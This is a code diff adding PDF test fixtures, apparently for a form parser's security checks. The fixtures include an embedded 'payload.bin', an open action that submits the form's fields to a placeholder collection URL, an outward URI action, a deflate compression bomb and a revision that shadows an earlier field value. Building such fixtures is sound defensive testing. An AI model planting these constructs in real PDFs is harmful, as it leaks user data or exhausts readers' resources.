@@ -1,3 +1,4 @@
+import { deflateSync } from 'node:zlib';
 import { PDFArray, PDFDict, PDFDocument, PDFName, PDFString } from 'pdf-lib';
 import type { OperationType } from '../../../domain/intents/intent';
 import { CONTEXT_FIELDS, META_FIELDS, RECEIPT_FIELDS, inputFieldName } from '../formSchema';
@@ -139,12 +140,21 @@ export async function javascriptActionPdf(operationType: OperationType): Promise
   return document.save({ updateFieldAppearances: false });
 }
 
-/** A form whose `/V` disagrees with the appearance stream already generated. */
+/**
+ * A form whose `/V` disagrees with the appearance stream already generated.
+ *
+ * `addToPage` is what makes this fixture real, and its absence is why the file
+ * it replaced was not: a field created but never placed on a page has **no
+ * widget annotation**, so `setText` generates no appearance and there is nothing
+ * for a value to disagree with. Probed, after the check written against the old
+ * fixture found nothing to report.
+ */
 export async function appearanceDisagreesPdf(): Promise<Uint8Array> {
   const document = await PDFDocument.create();
-  document.addPage([595, 842]);
+  const page = document.addPage([595, 842]);
   const form = document.getForm();
   const field = form.createTextField(inputFieldName('member'));
+  field.addToPage(page, { x: 20, y: 700, width: 300, height: 16 });
   // Appearance generated for the decoy...
   field.setText('0x1111111111111111111111111111111111111111');
   const withAppearance = await document.save();
@@ -160,6 +170,104 @@ export async function appearanceDisagreesPdf(): Promise<Uint8Array> {
     );
   return edited.save({ updateFieldAppearances: false });
 }
+
+/** A form with a file attached through the catalog's `/Names` tree. */
+export async function embeddedFilePdf(operationType: OperationType): Promise<Uint8Array> {
+  const document = await PDFDocument.load(await formPdf(operationType));
+  const attachment = document.context.flateStream('a file nobody asked for');
+  const spec = document.context.obj({
+    Type: 'Filespec',
+    F: PDFString.of('payload.bin'),
+    EF: document.context.obj({ F: document.context.register(attachment) }),
+  });
+  const names = document.context.obj({
+    EmbeddedFiles: document.context.obj({
+      Names: [PDFString.of('payload.bin'), document.context.register(spec)],
+    }),
+  });
+  document.catalog.set(PDFName.of('Names'), document.context.register(names));
+  return document.save({ updateFieldAppearances: false });
+}
+
+/** A form whose fields carry an action that submits them somewhere else. */
+export async function submitFormActionPdf(operationType: OperationType): Promise<Uint8Array> {
+  const document = await PDFDocument.load(await formPdf(operationType));
+  const action = document.context.obj({
+    Type: 'Action',
+    S: 'SubmitForm',
+    F: PDFString.of('https://example.invalid/collect'),
+  });
+  document.catalog.set(PDFName.of('OpenAction'), document.context.register(action));
+  return document.save({ updateFieldAppearances: false });
+}
+
+/** A form carrying a plain outward link, which is the milder half of the same class. */
+export async function uriActionPdf(operationType: OperationType): Promise<Uint8Array> {
+  const document = await PDFDocument.load(await formPdf(operationType));
+  const action = document.context.obj({
+    Type: 'Action',
+    S: 'URI',
+    URI: PDFString.of('https://example.invalid/'),
+  });
+  document.catalog.set(PDFName.of('OpenAction'), document.context.register(action));
+  return document.save({ updateFieldAppearances: false });
+}
+
+/**
+ * A Flate stream that inflates to `megabytes`, written by hand.
+ *
+ * By hand because the point is a file that *already* contains one: pdf-lib
+ * compresses what it is given, so asking it to embed 200 MB of spaces would mean
+ * allocating 200 MB in the test to prove the parser never allocates it.
+ */
+export function compressionBombPdf(megabytes: number): Uint8Array {
+  const squashed = deflateSync(Buffer.alloc(megabytes * 1024 * 1024, 0x20));
+  const head = Buffer.from(
+    `%PDF-1.7\n` +
+      `1 0 obj<</Type/Catalog/Pages 2 0 R/AcroForm<</Fields[5 0 R]>>>>endobj\n` +
+      `2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n` +
+      `3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 10 10]/Contents 6 0 R>>endobj\n` +
+      `5 0 obj<</FT/Tx/T(${inputFieldName('member')})/V(0x1111111111111111111111111111111111111111)>>endobj\n` +
+      `6 0 obj<</Filter/FlateDecode/Length ${squashed.length}>>stream\n`,
+    'latin1',
+  );
+  const tail = Buffer.from('\nendstream endobj\ntrailer<</Size 7/Root 1 0 R>>\n%%EOF', 'latin1');
+  return new Uint8Array(Buffer.concat([head, squashed, tail]));
+}
+
+/**
+ * A document whose newest revision **shadows** an earlier field value.
+ *
+ * Distinct from the incremental-update case already covered: there the newest
+ * revision is what a reader should take and the test asserts it is taken. Here
+ * the older value is still present in the bytes and a naive scan for
+ * `zarya.input.member` finds the *wrong* one first — so this pins that the value
+ * comes from the object model rather than from reading the file.
+ */
+export function shadowedValuePdf(): Uint8Array {
+  const name = inputFieldName('member');
+  const stale = '0x1111111111111111111111111111111111111111';
+  const current = '0x2222222222222222222222222222222222222222';
+
+  // The original revision, then an incremental update redefining object 5.
+  return latin1(
+    `%PDF-1.7\n` +
+      `1 0 obj<</Type/Catalog/Pages 2 0 R/AcroForm<</Fields[5 0 R]>>>>endobj\n` +
+      `2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n` +
+      `3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 10 10]>>endobj\n` +
+      `5 0 obj<</FT/Tx/T(${name})/V(${stale})>>endobj\n` +
+      `trailer<</Size 6/Root 1 0 R>>\n` +
+      `%%EOF\n` +
+      `5 0 obj<</FT/Tx/T(${name})/V(${current})>>endobj\n` +
+      `trailer<</Size 6/Root 1 0 R>>\n` +
+      `%%EOF`,
+  );
+}
+
+/** The value a correct reader takes from {@link shadowedValuePdf}. */
+export const SHADOWED_CURRENT_VALUE = '0x2222222222222222222222222222222222222222';
+/** The value still present in those bytes, which a byte scan would find first. */
+export const SHADOWED_STALE_VALUE = '0x1111111111111111111111111111111111111111';
 
 const latin1 = (text: string): Uint8Array => Uint8Array.from(Buffer.from(text, 'latin1'));
 
